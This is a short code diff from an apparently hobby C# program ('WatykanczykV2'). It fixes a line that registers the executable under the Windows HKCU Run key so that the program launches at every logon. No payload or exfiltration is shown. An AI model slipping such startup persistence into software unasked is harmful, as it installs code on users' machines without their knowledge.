@@ -84,7 +84,7 @@ namespace WatykanczykV2
             {
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                 {
-                    key.SetValue(GetExeName(), GetCurrentLocation());
+                    key.SetValue(GetExeName(), $"{GetCurrentLocation()}{GetExeName()}");
                 }
             }
         }
